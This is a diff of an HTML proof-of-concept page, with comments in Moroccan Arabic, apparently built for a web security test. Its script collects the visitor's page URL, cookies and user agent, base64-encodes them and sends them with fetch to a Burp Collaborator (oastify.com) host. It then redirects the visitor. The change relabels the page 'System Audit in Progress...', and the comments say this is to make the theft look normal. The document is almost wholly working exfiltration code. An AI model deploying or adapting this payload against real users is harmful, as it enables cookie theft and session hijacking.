@@ -1,19 +1,33 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Security Analysis PoC</title>
+</head>
 <body>
-    <h1>Security Research PoC - Data Exfiltration Test</h1>
+    <h1>System Audit in Progress...</h1>
     <script>
-        var exfil_url = "https://webhook.site/9c096ee5-6cf5-45e5-bbf4-af7191f6bb55";
+        // حط هنا رابط الـ Burp Collaborator ديالك
+        var collaborator_url = "z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com";
         
-        // غانجمعو معلومات مخلطة: الكوكيز اللي مسموح بيهم + رابط الصفحة + التوقيت
-        var leaked_info = "URL: " + window.location.href + 
-                          " | Cookies: " + document.cookie + 
-                          " | UserAgent: " + navigator.userAgent;
+        // جمع الداتا الحساسة (الـ DOM والـ Cookies المتاحة)
+        var leaked_info = {
+            location: window.location.href,
+            cookies: document.cookie,
+            ua: navigator.userAgent,
+            timestamp: new Date().getTime()
+        };
 
-        var encoded_data = btoa(unescape(encodeURIComponent(leaked_info)));
+        // تشفير الداتا بـ Base64
+        var payload = btoa(unescape(encodeURIComponent(JSON.stringify(leaked_info))));
         
-        // صيفط الداتا
-        window.location.href = exfil_url + "?id=" + encoded_data;
+        // إرسال الداتا لـ Burp Collaborator عبر طلب Fetch
+        // هاد الطريقة غاتخلي Burp يسجل الـ Request والـ IP والـ Headers
+        fetch(collaborator_url + "/?exfil=" + payload, {
+            mode: 'no-cors'
+        }).then(() => {
+            // تحويل الصفحة باش تبان العملية طبيعية
+            window.location.href = collaborator_url + "/success";
+        });
     </script>
 </body>
 </html>
